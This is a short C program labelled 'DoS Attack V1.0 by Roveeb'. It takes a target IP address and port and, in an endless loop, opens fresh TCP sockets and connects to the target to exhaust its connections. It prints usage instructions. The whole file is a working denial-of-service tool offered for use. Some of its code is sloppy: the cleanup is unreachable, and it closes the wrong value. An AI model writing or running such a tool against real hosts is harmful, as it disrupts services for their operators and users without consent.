#include<stdio.h>
#include<stdlib.h>
#include <sys/socket.h> // Core BSD socket functions and data structures.
#include <netinet/in.h> // AF_INET and AF_INET6 address families and their

int main (int argc, char *argv[]){
	if(argc <= 2){
		printf("DoS Attack V1.0 by Roveeb");
		printf("Usage mode: ./DoS 192.168.0.1 21");
		printf("./DoS ip port");
	} else {
		int mysocket;
		int connection;

		char *ip;
		ip = argv[1];

		int port;
		port = atoi(argv[2]);

		struct sockaddr_in target;

		while(1){
			mysocket = socket(AF_INET,SOCK_STREAM,0);
			target.sin_family = AF_INET;
			target.sin_port = htons(port);
			target.sin_addr.s_addr = inet_addr(ip);

			connection = connect(mysocket, (struct sockaddr *)&target, sizeof target);

			if(connection == 0){
				printf("Attacking host at address: %s and port: %i\n",ip,port);
			} else {
				printf("Host not found\n");
				return 0;
			}
		}
		close(connection);
		close(mysocket);
		return 0;
	}
}
